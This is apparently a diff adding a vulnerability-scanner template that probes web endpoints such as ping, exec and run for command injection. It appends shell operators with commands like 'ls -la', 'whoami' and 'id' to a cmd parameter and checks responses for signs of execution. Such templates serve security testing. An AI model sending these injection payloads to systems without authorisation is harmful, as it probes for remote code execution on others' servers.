@@ -1,0 +1,46 @@
+id: rce-p1
+
+info:
+  name: Command Injection - Basic Operators
+  author: custom
+  severity: critical
+  description: Command injection using basic shell operators (;, |, &, &&, ||)
+  tags: rce,command-injection,waf-bypass
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?cmd={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        cmd={{payload}}
+
+    payloads:
+      payload:
+        - "; ls -la"
+        - "| ls -la"
+        - "|| ls -la"
+        - "& ls -la"
+        - "&& ls -la"
+        - "; whoami"
+        - "| whoami"
+        - "& id"
+      path:
+        - "ping"
+        - "exec"
+        - "run"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "uid="
+          - "total "
+        condition: or
